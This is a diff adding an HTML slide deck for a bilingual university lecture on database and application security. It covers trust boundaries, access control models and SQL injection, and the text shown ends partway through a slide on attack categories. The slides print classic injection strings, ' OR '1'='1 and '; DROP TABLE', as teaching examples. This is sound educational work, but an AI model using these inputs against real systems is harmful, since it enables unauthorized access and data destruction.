@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark" data-lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TC2007B · Week 3 · Lecture 1 — Database and Application Security</title>
+<meta name="description" content="Database and application security: trust boundaries, SQL injection attacks and countermeasures, inference attacks, database encryption, OWASP Top 10, and XSS. Week 3, Lecture 1 of TC2007B.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+<style>
+/* ---- Lecture-local additions ---- */
+.bar-chart { display: flex; flex-direction: column; gap: .6rem; margin-top: 1.2rem; }
+.bar-row { display: flex; align-items: center; gap: .8rem; font-size: var(--fs-small); }
+.bar-label { width: 14ch; flex: none; text-align: right; color: var(--ink-soft); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.bar-track { flex: 1; background: var(--bg-3); border-radius: 6px; height: 1.6rem; overflow: hidden; }
+.bar-fill { height: 100%; border-radius: 6px; display: flex; align-items: center; padding-left: .5rem; font-weight: 700; font-size: var(--fs-small); color: #fff; white-space: nowrap; }
+.bar-fill.xss  { background: var(--accent); }
+.bar-fill.sqli { background: var(--danger); }
+.bar-fill.med  { background: var(--warn); }
+.bar-fill.low  { background: var(--accent-2); }
+.bar-fill.vlow { background: var(--violet); }
+
+.sql-block {
+  background: var(--bg-3); border: 1px solid var(--line);
+  border-radius: 14px; padding: 1.2rem 1.6rem;
+  font-family: var(--mono); font-size: clamp(.9rem, 1.6vw, 1.25rem);
+  margin-top: 1.2rem; line-height: 1.8;
+}
+.sql-kw  { color: var(--accent); font-weight: 700; }
+.sql-col { color: var(--accent-2); }
+.sql-tbl { color: var(--good); }
+.sql-val { color: var(--warn); }
+.sql-inj { color: var(--danger); font-weight: 700; text-decoration: underline wavy var(--danger); }
+
+.cia-table { width: 100%; border-collapse: collapse; margin-top: 1.2rem; font-size: clamp(.78rem, 1.3vw, 1.05rem); }
+.cia-table th, .cia-table td { border: 1px solid var(--line); padding: .65rem .9rem; vertical-align: top; }
+.cia-table thead th { background: var(--bg-3); color: var(--accent); font-size: var(--fs-small); text-transform: uppercase; letter-spacing: .07em; }
+.cia-table tbody td:first-child { font-weight: 800; color: var(--ink); background: var(--bg-2); white-space: nowrap; }
+.cia-table tbody tr:hover { background: rgba(78,161,255,.05); }
+
+.trust-row { display: flex; align-items: stretch; gap: 0; flex-wrap: nowrap; margin-top: 1.4rem; }
+.trust-node { flex: 1; background: var(--bg-2); border: 2px solid var(--line); border-radius: 12px; padding: .8rem .6rem; text-align: center; }
+.trust-node .t-title { font-weight: 800; font-size: var(--fs-body); color: var(--ink); }
+.trust-node .t-sub { font-size: var(--fs-small); color: var(--ink-soft); margin-top: .2rem; }
+.trust-arrow { display: flex; align-items: center; justify-content: center; font-size: 1.3rem; color: var(--accent); padding: 0 .25rem; flex: none; }
+.trust-attacks { display: flex; gap: .8rem; margin-top: .9rem; }
+.attack-badge { flex: 1; background: rgba(255,107,107,.1); border: 1px solid var(--danger); border-radius: 10px; padding: .5rem .7rem; font-size: var(--fs-small); color: var(--ink-soft); line-height: 1.4; }
+.attack-badge strong { color: var(--danger); }
+
+.owasp-col { display: flex; flex-direction: column; gap: .4rem; }
+.owasp-row { display: flex; align-items: center; gap: .7rem; background: var(--bg-2); border: 1px solid var(--line); border-left: 4px solid var(--line); border-radius: 8px; padding: .45rem .8rem; font-size: clamp(.7rem, 1.2vw, .95rem); }
+.owasp-row.highlight { border-left-color: var(--accent); background: rgba(78,161,255,.08); }
+.owasp-row .ow-num { font-weight: 900; color: var(--accent); min-width: 2.5ch; }
+</style>
+</head>
+<body>
+
+<div class="topbar"><div class="fill" id="progress"></div></div>
+
+<div class="controls">
+  <a href="/teaching/information-security/" class="ui-btn" title="Back to course / Volver al curso" style="text-decoration:none">⌂</a>
+  <button class="ui-btn" id="langBtn" title="Español / English">ES</button>
+  <button class="ui-btn" id="themeBtn" title="Light / Dark">☀</button>
+</div>
+
+<main class="deck" id="deck">
+
+  <!-- ===================== A. ORIENTATION ===================== -->
+
+  <!-- S1 — Title -->
+  <section class="slide title-slide active" data-section="Orientation" data-section-es="Orientación">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>TC2007B · Semana 3 · Clase 1"><span class="dot"></span>TC2007B · Week 3 · Lecture 1</span>
+      <h1 data-es="Seguridad en Bases de Datos y Aplicaciones">Database &amp; Application Security</h1>
+      <div class="title-rule"></div>
+      <p class="lead" data-es="El objetivo final del atacante no es la aplicación — es <em>los datos</em> que hay detrás.">The attacker's ultimate target isn't the application — it's <em>the data</em> behind it.</p>
+      <div class="title-meta">
+        <span class="pill" data-es="Profesor: Mahdi Zareei">Instructor: Mahdi Zareei</span>
+        <span class="pill" data-es="SQLi · XSS · OWASP · Cifrado de BD">SQLi · XSS · OWASP · DB Encryption</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- S2 — Objectives -->
+  <section class="slide" data-section="Orientation" data-section-es="Orientación">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Qué veremos hoy"><span class="dot"></span>What we'll cover</span>
+      <h2 data-es="Objetivos de la clase">Lecture objectives</h2>
+      <div class="grid cols-2">
+        <div class="card accent-top"><span class="ico">🏛️</span><h3 data-es="App vs. BD">App vs. DB</h3><p data-es="Distinguir los ataques a nivel de aplicación de los ataques a nivel de datos y definir los límites de confianza.">Distinguish application-level from data-level attacks and define trust boundaries.</p></div>
+        <div class="card teal-top"><span class="ico">🔒</span><h3 data-es="Requisitos de seguridad en BD">DB Security Requirements</h3><p data-es="Integridad física, lógica y de elementos; control de acceso, autenticación y disponibilidad.">Physical, logical, and element integrity; access control, authentication, and availability.</p></div>
+        <div class="card warn-top"><span class="ico">💉</span><h3 data-es="Inyección SQL">SQL Injection</h3><p data-es="Tipos de ataque SQLi (inband, inferencial, OOB) y cómo funcionan realmente.">SQLi attack types (inband, inferential, OOB) and how they actually work.</p></div>
+        <div class="card good-top"><span class="ico">🛡️</span><h3 data-es="Contramedidas y OWASP">Countermeasures &amp; OWASP</h3><p data-es="Consultas parametrizadas, OWASP Top 10, y Cross-Site Scripting.">Parameterized queries, OWASP Top 10, and Cross-Site Scripting.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S3 — Why it matters -->
+  <section class="slide" data-section="Orientation" data-section-es="Orientación">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>El panorama de amenazas web"><span class="dot"></span>The web threat landscape</span>
+      <h2 data-es="¿Por qué importa? Distribución de ataques web">Why it matters: distribution of web attacks</h2>
+      <div class="bar-chart">
+        <div class="bar-row"><span class="bar-label">Cross-Site Scripting</span><div class="bar-track"><div class="bar-fill xss" style="width:78%">39.1 %</div></div></div>
+        <div class="bar-row"><span class="bar-label">SQL Injection</span><div class="bar-track"><div class="bar-fill sqli" style="width:50%">24.9 %</div></div></div>
+        <div class="bar-row"><span class="bar-label">Path Traversal</span><div class="bar-track"><div class="bar-fill med" style="width:13.2%">6.6 %</div></div></div>
+        <div class="bar-row"><span class="bar-label">Info Leakage</span><div class="bar-track"><div class="bar-fill low" style="width:9.2%">4.6 %</div></div></div>
+        <div class="bar-row"><span class="bar-label">OS Commanding</span><div class="bar-track"><div class="bar-fill low" style="width:8.8%">4.4 %</div></div></div>
+        <div class="bar-row"><span class="bar-label">XML Injection</span><div class="bar-track"><div class="bar-fill low" style="width:8.4%">4.2 %</div></div></div>
+        <div class="bar-row"><span class="bar-label" data-es="Otros ataques">Other attacks</span><div class="bar-track"><div class="bar-fill vlow" style="width:42%">~20.2 %</div></div></div>
+      </div>
+      <p class="figure-note" data-es="Fuente: datos de informe de amenazas web (valores aproximados e ilustrativos). XSS + SQLi representan casi dos tercios de todos los ataques registrados.">Source: web threat report data (approximate, illustrative values). XSS + SQLi account for nearly two-thirds of all recorded attacks.</p>
+    </div>
+  </section>
+
+  <!-- ===================== B. APP VS DB SECURITY ===================== -->
+
+  <!-- S4 — Section divider -->
+  <section class="slide section" data-section="App vs DB" data-section-es="App vs BD">
+    <div class="slide-inner">
+      <div class="num">01</div>
+      <h1 data-es="¿Dónde está el objetivo real?">Where is the real target?</h1>
+      <p class="lead" data-es="La aplicación es la puerta — los datos son el tesoro.">The application is the door — the data is the treasure.</p>
+    </div>
+  </section>
+
+  <!-- S5 — DB security is an extension -->
+  <section class="slide" data-section="App vs DB" data-section-es="App vs BD">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>El objetivo final"><span class="dot"></span>The ultimate target</span>
+      <h2 data-es="La seguridad en BD es una extensión de la seguridad de la aplicación">DB security is an extension of application security</h2>
+      <ul class="clean">
+        <li data-es="Las aplicaciones web son simplemente un <strong>punto de entrada</strong>.">Web applications are simply an <strong>entry point</strong>.</li>
+        <li data-es="El objetivo final para la mayoría de los atacantes son <strong>los datos</strong>: credenciales, PII, registros financieros, propiedad intelectual.">The ultimate target for most attackers is <strong>the data</strong>: credentials, PII, financial records, intellectual property.</li>
+        <li data-es="Las BD mal protegidas suelen otorgar <strong>privilegios elevados</strong> (root / admin) al ser explotadas.">Poorly secured DBs often grant <strong>elevated privileges</strong> (root / admin) when exploited.</li>
+        <li data-es="Una BD comprometida permite <strong>movimiento lateral</strong> y acceso persistente a toda la infraestructura.">A compromised database enables <strong>lateral movement</strong> and persistent access across the infrastructure.</li>
+      </ul>
+      <div class="callout discuss"><span class="tag" data-es="Analogía">Analogy</span><p data-es="Atacar una aplicación es como irrumpir en la oficina de un banco. Atacar la BD es asaltar directamente la caja fuerte. ¿Cuál preferiría un atacante paciente con tiempo y recursos? ¿Por qué?">Attacking an app is like breaking into a bank's lobby. Attacking the DB is cracking the vault directly. Which would a patient, resourceful attacker prefer? Why?</p></div>
+    </div>
+  </section>
+
+  <!-- S6 — App vs DB comparison -->
+  <section class="slide" data-section="App vs DB" data-section-es="App vs BD">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Dos capas de defensa"><span class="dot"></span>Two layers of defense</span>
+      <h2 data-es="Seguridad de aplicación vs. seguridad de base de datos">Application security vs. database security</h2>
+      <div class="split">
+        <div class="card accent-top">
+          <h3 data-es="Seguridad de la aplicación">Application security</h3>
+          <p data-es="Se centra en cómo <strong>se comporta la aplicación</strong>: manejo de entradas, autenticación, gestión de sesiones, comportamiento de la API, etc.">Focuses on how the <strong>application behaves</strong>: input handling, authentication, session management, API behavior, etc.</p>
+        </div>
+        <div class="card teal-top">
+          <h3 data-es="Seguridad de la base de datos">Database security</h3>
+          <p data-es="Garantiza que el <strong>almacén de datos subyacente</strong> no pueda ser comprometido, abusado ni mal usado, incluso si la capa de aplicación es parcialmente eludida.">Ensures the <strong>underlying data store</strong> cannot be compromised, abused, or misused — even if the application layer is partially bypassed.</p>
+        </div>
+      </div>
+      <div class="callout note" style="margin-top:1.2rem"><span class="tag" data-es="Clave">Key</span><p data-es="Una aplicación bien protegida con una BD mal asegurada sigue siendo <strong>vulnerable</strong>. La defensa en profundidad requiere operar en <em>ambas</em> capas simultáneamente.">A well-secured app with a poorly secured DB is still <strong>vulnerable</strong>. Defense-in-depth requires operating at <em>both</em> layers simultaneously.</p></div>
+    </div>
+  </section>
+
+  <!-- S7 — CIA Triad in context -->
+  <section class="slide" data-section="App vs DB" data-section-es="App vs BD">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>La tríada CIA aplicada"><span class="dot"></span>The CIA triad applied</span>
+      <h2 data-es="CIA en el contexto de app / BD">CIA in the app / DB context</h2>
+      <table class="cia-table">
+        <thead>
+          <tr>
+            <th data-es="Principio">Principle</th>
+            <th data-es="Capa de aplicación">Application layer</th>
+            <th data-es="Capa de base de datos">Database layer</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td data-es="Confidencialidad">Confidentiality</td>
+            <td data-es="Prevenir fugas de credenciales de usuario y tokens de sesión">Preventing leakage of user credentials / session tokens</td>
+            <td data-es="Proteger los datos almacenados del acceso no autorizado">Protecting stored data from unauthorized access</td>
+          </tr>
+          <tr>
+            <td data-es="Integridad">Integrity</td>
+            <td data-es="Prevenir la manipulación de solicitudes HTTP y parámetros">Preventing tampering of HTTP requests / parameters</td>
+            <td data-es="Prevenir la modificación no autorizada de registros o del esquema">Preventing unauthorized modification of records or schema</td>
+          </tr>
+          <tr>
+            <td data-es="Disponibilidad">Availability</td>
+            <td data-es="Defenderse contra DoS en los endpoints de la aplicación">Defending against DoS on app endpoints</td>
+            <td data-es="Garantizar que la BD permanezca accesible y eficiente bajo carga">Ensuring the DB remains accessible and performant under load</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- S8 — Trust Boundaries -->
+  <section class="slide" data-section="App vs DB" data-section-es="App vs BD">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Tres capas, tres zonas de ataque"><span class="dot"></span>Three tiers, three attack zones</span>
+      <h2 data-es="Entendiendo los límites de confianza">Understanding trust boundaries</h2>
+      <div class="trust-row">
+        <div class="trust-node" style="border-color:var(--accent)"><div class="t-title" data-es="Cliente">Client</div><div class="t-sub">Browser</div></div>
+        <div class="trust-arrow">⟶</div>
+        <div class="trust-node" style="border-color:var(--warn)"><div class="t-title" data-es="Servidor Web">Web Server</div><div class="t-sub">HTTP</div></div>
+        <div class="trust-arrow">⟶</div>
+        <div class="trust-node" style="border-color:var(--violet)"><div class="t-title" data-es="Servidor de App">App Server</div><div class="t-sub" data-es="lógica de negocio">business logic</div></div>
+        <div class="trust-arrow">⟶</div>
+        <div class="trust-node" style="border-color:var(--danger)"><div class="t-title" data-es="Base de Datos">Database</div><div class="t-sub" data-es="datos sensibles">sensitive data</div></div>
+      </div>
+      <div class="trust-attacks">
+        <div class="attack-badge"><strong>XSS, CSRF, DDoS</strong><br><span data-es="ataques al cliente / servidor web">client / web server attacks</span></div>
+        <div class="attack-badge"><strong>SQLi, <span data-es="autenticación rota">broken auth</span></strong><br><span data-es="ataques al servidor de app">app server attacks</span></div>
+        <div class="attack-badge"><strong data-es="Escalación de privilegios, exfiltración">Privilege escalation, exfil</strong><br><span data-es="ataques a la capa de BD">database layer attacks</span></div>
+      </div>
+      <div class="callout note" style="margin-top:.8rem"><span class="tag" data-es="Nota">Note</span><p data-es="Cada límite de confianza es un límite donde la entrada no debe confiarse automáticamente. El modelo de amenaza cambia a cada cruce.">Each trust boundary is a boundary where input should not be automatically trusted. The threat model changes at every crossing.</p></div>
+    </div>
+  </section>
+
+  <!-- ===================== C. SECURITY REQUIREMENTS ===================== -->
+
+  <!-- S9 — Section divider -->
+  <section class="slide section" data-section="Security Requirements" data-section-es="Requisitos de Seguridad">
+    <div class="slide-inner">
+      <div class="num">02</div>
+      <h1 data-es="¿Qué necesita una BD segura?">What does a secure DB need?</h1>
+      <p class="lead" data-es="Cinco categorías de requisitos de seguridad.">Five categories of security requirements.</p>
+    </div>
+  </section>
+
+  <!-- S10 — Overview of requirements (fragments) -->
+  <section class="slide" data-section="Security Requirements" data-section-es="Requisitos de Seguridad">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Panorama general"><span class="dot"></span>Overview</span>
+      <h2 data-es="Requisitos de seguridad en bases de datos">Database security requirements</h2>
+      <div class="grid cols-3">
+        <div class="card accent-top fragment"><span class="ico">🏗️</span><h3 data-es="Integridad física">Physical integrity</h3><p data-es="Inmunidad ante catástrofes físicas: cortes de energía, fallos de disco, desastres.">Immunity to physical catastrophes: power failures, disk failures, disasters.</p></div>
+        <div class="card teal-top fragment"><span class="ico">🧩</span><h3 data-es="Integridad lógica">Logical integrity</h3><p data-es="Coherencia de la BD y capacidad de reconstrucción mediante registros de transacciones.">DB consistency and reconstructability via transaction logs.</p></div>
+        <div class="card good-top fragment"><span class="ico">🔍</span><h3 data-es="Integridad de elemento">Element integrity</h3><p data-es="Correctitud de campos individuales: validaciones, controles de acceso y registros de cambios.">Correctness of individual fields: field checks, access controls, and change logs.</p></div>
+        <div class="card warn-top fragment"><span class="ico">📋</span><h3 data-es="Auditabilidad">Auditability</h3><p data-es="Registrar todas las lecturas y escrituras con sello de tiempo, usuario e IP.">Log all reads and writes with timestamp, user, and IP.</p></div>
+        <div class="card violet-top fragment"><span class="ico">🔑</span><h3 data-es="Control de acceso y autenticación">Access control &amp; auth</h3><p data-es="Separación lógica por privilegios de usuario; autenticación independiente y rigurosa.">Logical separation by user privileges; independent and rigorous authentication.</p></div>
+        <div class="card danger-top fragment"><span class="ico">⚡</span><h3 data-es="Disponibilidad">Availability</h3><p data-es="Soporte para usuarios concurrentes y fiabilidad bajo carga de producción.">Support for concurrent users and reliability under production load.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S11 — Physical & Logical Integrity -->
+  <section class="slide" data-section="Security Requirements" data-section-es="Requisitos de Seguridad">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Integridad física y lógica"><span class="dot"></span>Physical &amp; logical integrity</span>
+      <h2 data-es="Proteger los datos cuando las cosas salen mal">Protecting data when things go wrong</h2>
+      <div class="split">
+        <div class="card accent-top">
+          <h3 data-es="Integridad física">Physical integrity</h3>
+          <ul class="clean" style="margin-top:.8rem">
+            <li data-es="Seguridad física del hardware: racks cerrados, centros de datos con control de acceso.">Physical hardware security: locked racks, access-controlled data centers.</li>
+            <li data-es="SAI (UPS) para proteger contra cortes de energía.">UPS / backup power for outages.</li>
+            <li data-es="Copias de seguridad periódicas y fuera del sitio (offsite).">Regular off-site backups.</li>
+          </ul>
+        </div>
+        <div class="card teal-top">
+          <h3 data-es="Integridad lógica — reconstrucción">Logical integrity — reconstruction</h3>
+          <ul class="clean" style="margin-top:.8rem">
+            <li data-es="Mantener un <strong>registro de transacciones</strong> de cada operación de escritura.">Maintain a <strong>transaction log</strong> of every write operation.</li>
+            <li data-es="Reproducir el registro para restaurar el sistema a un punto estable después de un fallo.">Replay the log to restore the system to a stable point after a crash.</li>
+            <li data-es="La confirmación en dos fases (<strong>2PC</strong>) garantiza que las escrituras distribuidas sean atómicas.">Two-phase commit (<strong>2PC</strong>) ensures distributed writes are atomic.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S12 — Element integrity + access control policies -->
+  <section class="slide" data-section="Security Requirements" data-section-es="Requisitos de Seguridad">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Datos correctos, acceso correcto"><span class="dot"></span>Correct data, correct access</span>
+      <h2 data-es="Integridad de elemento, auditabilidad y control de acceso">Element integrity, auditability &amp; access control</h2>
+      <div class="grid cols-3">
+        <div class="card good-top">
+          <h3 data-es="Integridad de elemento">Element integrity</h3>
+          <ul class="clean" style="margin-top:.6rem; gap:.5rem">
+            <li data-es="<strong>Validación de campos</strong>: solo valores aceptables."><strong>Field checks</strong>: only acceptable values.</li>
+            <li data-es="<strong>Control de acceso</strong>: solo usuarios autorizados pueden actualizar."><strong>Access controls</strong>: only authorized users can update.</li>
+            <li data-es="<strong>Registro de cambios</strong>: para deshacer errores."><strong>Change log</strong>: to undo errors.</li>
+          </ul>
+        </div>
+        <div class="card warn-top">
+          <h3 data-es="Auditabilidad">Auditability</h3>
+          <ul class="clean" style="margin-top:.6rem; gap:.5rem">
+            <li data-es="Registrar cada lectura/escritura en la BD con sello de tiempo, usuario e IP.">Log every read/write with timestamp, user, IP.</li>
+            <li data-es="Los registros deben ser <strong>a prueba de manipulación</strong>.">Logs must be <strong>tamper-proof</strong>.</li>
+            <li data-es="Esenciales para la respuesta a incidentes y el cumplimiento normativo.">Essential for incident response and compliance.</li>
+          </ul>
+        </div>
+        <div class="card violet-top">
+          <h3 data-es="Control de acceso">Access control</h3>
+          <ul class="clean" style="margin-top:.6rem; gap:.5rem">
+            <li data-es="Separación lógica por <strong>privilegios de usuario</strong>.">Logical separation by <strong>user privileges</strong>.</li>
+            <li data-es="Más complejo que el SO debido a la <em>granularidad</em>, la inferencia y la agregación.">More complex than OS due to <em>granularity</em>, inference, and aggregation.</li>
+            <li data-es="La autenticación de BD puede ser independiente del SO.">DB authentication can be independent of the OS.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S13 — Access control policies (4 models) -->
+  <section class="slide" data-section="Security Requirements" data-section-es="Requisitos de Seguridad">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Políticas de control de acceso"><span class="dot"></span>Access control policies</span>
+      <h2 data-es="Cuatro modelos para decidir quién puede hacer qué">Four models for deciding who can do what</h2>
+      <div class="grid cols-2">
+        <div class="card accent-top"><h3>DAC</h3><p data-es="<strong>Control discrecional</strong>: el <em>propietario del objeto</em> otorga permisos a su discreción. Flexible pero propenso a errores humanos."><strong>Discretionary</strong>: the <em>object owner</em> grants permissions at their discretion. Flexible but error-prone.</p></div>
+        <div class="card teal-top"><h3>MAC</h3><p data-es="<strong>Control obligatorio</strong>: la política la define el sistema/organización, no el usuario. Rígido, muy seguro (común en militar/gobierno)."><strong>Mandatory</strong>: policy set by the system/org, not the user. Rigid, very secure (common in military/gov).</p></div>
+        <div class="card good-top"><h3>RBAC</h3><p data-es="<strong>Basado en roles</strong>: permisos asignados a <em>roles</em>; los usuarios reciben roles. Escala bien, reduce la carga administrativa."><strong>Role-based</strong>: permissions assigned to <em>roles</em>; users get roles. Scales well, reduces admin burden.</p></div>
+        <div class="card warn-top"><h3>ABAC</h3><p data-es="<strong>Basado en atributos</strong>: las decisiones combinan atributos del usuario, el recurso y el entorno. El más flexible y expresivo."><strong>Attribute-based</strong>: decisions combine user, resource, and environment attributes. Most flexible and expressive.</p></div>
+      </div>
+      <div class="callout discuss" style="margin-top:.9rem"><span class="tag" data-es="Discusión">Discuss</span><p data-es="Un hospital: el médico de guardia necesita acceder a <em>cualquier</em> expediente en una emergencia, pero normalmente solo a sus propios pacientes. ¿Qué modelo — o combinación de modelos — se adapta mejor?">A hospital: the on-call doctor needs access to <em>any</em> record in an emergency, but normally only their own patients'. Which model — or combination — fits best?</p></div>
+    </div>
+  </section>
+
+  <!-- ===================== D. SQL INJECTION ===================== -->
+
+  <!-- S14 — Section divider -->
+  <section class="slide section" data-section="SQL Injection" data-section-es="Inyección SQL">
+    <div class="slide-inner">
+      <div class="num">03</div>
+      <h1 data-es="Inyección SQL">SQL Injection</h1>
+      <p class="lead" data-es="El ataque a BD más prevalente — y uno de los más evitables.">The most prevalent database attack — and one of the most preventable.</p>
+    </div>
+  </section>
+
+  <!-- S15 — What is SQLi -->
+  <section class="slide" data-section="SQL Injection" data-section-es="Inyección SQL">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Definición"><span class="dot"></span>Definition</span>
+      <h2 data-es="¿Qué es la inyección SQL (SQLi)?">What is SQL injection (SQLi)?</h2>
+      <div class="definition">
+        <blockquote data-es="El atacante manipula las consultas inyectando entradas maliciosas en las sentencias SQL, haciendo que la BD ejecute órdenes no intencionadas.">The attacker manipulates queries by injecting malicious input into SQL statements, causing the DB to execute unintended commands.</blockquote>
+      </div>
+      <div class="grid cols-3" style="margin-top:1.2rem">
+        <div class="card danger-top"><span class="ico">📤</span><h3 data-es="Extraer datos">Extract data</h3><p data-es="Leer registros sensibles, credenciales o PII sin autorización.">Read sensitive records, credentials, or PII without authorization.</p></div>
+        <div class="card danger-top"><span class="ico">✏️</span><h3 data-es="Modificar / borrar">Modify / delete</h3><p data-es="Alterar o destruir registros — daño potencialmente permanente.">Alter or destroy records — potentially permanent damage.</p></div>
+        <div class="card danger-top"><span class="ico">🔓</span><h3 data-es="Evadir autenticación">Bypass auth</h3><p data-es="Iniciar sesión sin contraseña válida manipulando la consulta de verificación de login.">Log in without a valid password by manipulating the login verification query.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S16 — SQLi attack avenues -->
+  <section class="slide" data-section="SQL Injection" data-section-es="Inyección SQL">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>¿Por dónde entra el ataque?"><span class="dot"></span>Attack avenues</span>
+      <h2 data-es="Formas de inyectar SQL malicioso">Ways to inject malicious SQL</h2>
+      <div class="grid cols-2">
+        <div class="card accent-top fragment"><h3 data-es="Entrada de usuario">User input</h3><p data-es="Campos de formulario, barras de búsqueda, pantallas de login — el vector más común.">Form fields, search bars, login screens — the most common vector.</p></div>
+        <div class="card teal-top fragment"><h3 data-es="Variables del servidor">Server variables</h3><p data-es="Cabeceras HTTP manipuladas (User-Agent, X-Forwarded-For) que se consultan o almacenan.">Manipulated HTTP headers (User-Agent, X-Forwarded-For) that get queried or stored.</p></div>
+        <div class="card warn-top fragment"><h3 data-es="Inyección de segundo orden">Second-order injection</h3><p data-es="Los datos se almacenan de forma segura, pero una operación <em>posterior</em> los usa sin saneamiento. Difícil de detectar.">Data stored safely, but a <em>later</em> operation uses it unsanitized. Hard to detect.</p></div>
+        <div class="card good-top fragment"><h3 data-es="Cookies">Cookies</h3><p data-es="Las cookies alteradas pueden cambiar las consultas si el servidor las usa directamente como parámetros.">Altered cookies can change DB queries if the server uses them directly as parameters.</p></div>
+        <div class="card violet-top fragment"><h3 data-es="Entrada física">Physical input</h3><p data-es="Fuera de la web: por ejemplo, un código de barras con SQL incrustado que lee un escáner de almacén.">Outside the web: e.g., a barcode with embedded SQL read by a warehouse scanner.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S17 — SQL query anatomy -->
+  <section class="slide" data-section="SQL Injection" data-section-es="Inyección SQL">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Anatomía de una consulta SQL"><span class="dot"></span>Anatomy of a SQL query</span>
+      <h2 data-es="Qué hace realmente esta consulta">What this query actually does</h2>
+      <div class="sql-block">
+        <span class="sql-kw">SELECT</span> <span class="sql-col">userid</span>, <span class="sql-col">salary</span><br>
+        <span class="sql-kw">FROM</span>&nbsp;&nbsp; <span class="sql-tbl">salaries</span><br>
+        <span class="sql-kw">WHERE</span>&nbsp; <span class="sql-col">userid</span> = <span class="sql-val">'jsmith'</span>
+      </div>
+      <div class="grid cols-2" style="margin-top:1rem">
+        <div class="card accent-top" style="padding:.9rem 1rem"><p data-es="<strong>SELECT userid, salary</strong> — elige qué columnas devolver."><strong>SELECT userid, salary</strong> — choose which columns to return.</p></div>
+        <div class="card teal-top" style="padding:.9rem 1rem"><p data-es="<strong>FROM salaries</strong> — nombra la tabla de origen."><strong>FROM salaries</strong> — name the source table.</p></div>
+        <div class="card warn-top" style="padding:.9rem 1rem"><p data-es="<strong>WHERE userid = 'jsmith'</strong> — filtra filas. Si el ID lo suministra el usuario, aquí entra la inyección."><strong>WHERE userid = 'jsmith'</strong> — filters rows. If the ID is user-supplied, this is the injection point.</p></div>
+        <div class="card danger-top" style="padding:.9rem 1rem"><p data-es="Sin validación, el atacante puede insertar <code>' OR '1'='1</code> y la condición siempre sera verdadera.">Without validation, the attacker inserts <code>' OR '1'='1</code> and the condition is always true.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- S18 — Tautology quiz -->
+  <section class="slide activity" data-section="SQL Injection" data-section-es="Inyección SQL">
+    <div class="slide-inner">
+      <span class="badge" data-es="◆ Actividad · Ataque de tautología">◆ Activity · Tautology attack</span>
+      <h2 style="margin-top:1rem" data-es="¿Qué devuelve esta consulta?">What does this query return?</h2>
+      <p class="lead" style="max-width:58ch" data-es="Un atacante introduce lo siguiente en el campo «nombre de usuario»:">An attacker types the following into the username field:</p>
+      <div class="sql-block">
+        username: <span class="sql-inj">' OR '1'='1</span><br><br>
+        <span class="sql-kw">SELECT</span> * <span class="sql-kw">FROM</span> <span class="sql-tbl">users</span><br>
+        <span class="sql-kw">WHERE</span> <span class="sql-col">username</span> = <span class="sql-val">'</span><span class="sql-inj">' OR '1'='1</span><span class="sql-val">'</span>
+      </div>
+      <div class="reveal-answer fragment">
+        <span class="ra-tag" data-es="Respuesta">Answer</span>
+        <p data-es="<code>'1'='1'</code> es siempre <strong>verdadera</strong>. El WHERE nunca filtra ninguna fila. La consulta devuelve <strong>todos los usuarios de la tabla</strong>. Si la aplicación verifica solo el primer resultado, el atacante inicia sesión como ese usuario — frecuentemente un administrador."><code>'1'='1'</code> is always <strong>true</strong>. The WHERE never filters any row. The query returns <strong>every user in the table</strong>. If the app checks only the first result, the attacker logs in as that user — often an admin.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- S19 — Three attack categories -->
+  <section class="slide" data-section="SQL Injection" data-section-es="Inyección SQL">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Tres categorías de ataque SQLi"><span class="dot"></span>Three SQLi attack categories</span>
+      <h2 data-es="Inband · Inferencial · Fuera de banda">Inband · Inferential · Out-of-band</h2>
+      <div class="grid cols-3">
+        <div class="card danger-top">
+          <span class="ico">📡</span>
+          <h3 data-es="Inband">Inband</h3>
+          <p data-es="Mismo canal HTTP para inyectar y recuperar resultados. Los datos aparecen directamente en la página web. Incluye:">Same HTTP channel to inject and retrieve. Data appears directly in the web page. Includes:</p>
+          <ul class="clean" style="margin-top:.6rem;gap:.3rem">
+            <li data-es="Tautología (<code>OR 1=1</code>)">Tautology (<code>OR 1=1</code>)</li>
+            <li data-es="Comentarios de fin de línea (<code>--</code>)">End-of-line comment (<code>--</code>)</li>
+            <li data-es="Consultas en cadena (<code>; DROP TABLE</code>)">Piggybacked queries (<code>; DROP TABLE</code>)</li>
+          </ul>
+        </div>
